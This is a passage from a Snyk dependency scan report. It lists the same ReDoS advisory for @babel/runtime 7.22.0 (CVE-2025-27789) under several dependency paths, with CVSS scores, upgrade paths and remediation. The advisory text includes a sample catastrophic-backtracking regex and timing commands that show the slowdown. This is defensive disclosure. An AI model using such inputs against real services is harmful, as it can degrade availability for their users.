        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@mui/material@5.13.2",
          "@mui/system@5.13.2",
          "@mui/styled-engine@5.13.2",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/material@5.13.2",
          "@mui/system@5.18.0",
          "@mui/styled-engine@5.18.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@mui/material@5.13.2",
          "react-transition-group@4.4.5",
          "dom-helpers@5.2.1",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/material@5.13.2",
          "react-transition-group@4.4.5",
          "dom-helpers@5.2.1",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@mui/styles@5.13.2",
          "jss-plugin-vendor-prefixer@10.10.0",
          "css-vendor@2.0.8",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/styles@5.18.0",
          "jss-plugin-vendor-prefixer@10.10.0",
          "css-vendor@2.0.8",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "react-router-dom@5.2.0",
          "react-router@5.2.0",
          "mini-create-react-context@0.4.1",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "react-router-dom@5.2.0",
          "react-router@5.2.0",
          "mini-create-react-context@0.4.1",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
